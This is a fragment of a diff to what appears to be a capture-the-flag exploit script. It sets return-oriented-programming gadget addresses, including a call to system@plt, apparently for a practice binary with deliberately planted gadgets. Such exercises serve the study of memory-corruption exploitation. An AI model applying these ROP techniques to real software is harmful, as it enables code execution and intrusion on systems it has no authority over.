@@ -108,8 +108,7 @@ conversions:
 
 '''
 
-#call_system = 0x00000000004006f0 # <system@plt
-call_system = 0x00000000004009e8
+call_system = 0x00000000004006f0 # <system@plt
 xor_byte_r15 = 0x0000000000400b30 # usefulGadgets + 0 -- xor BYTE PTR [r15],r14b; ret
 mov_r13_r12 = 0x0000000000400b34 # usefulGadgets + 4 -- mov    QWORD PTR [r13+0x0],r12; ret
 pop_r12_r13 = 0x0000000000400b3b # usefulGadgets + 11 -- pop r12; pop r13; ret
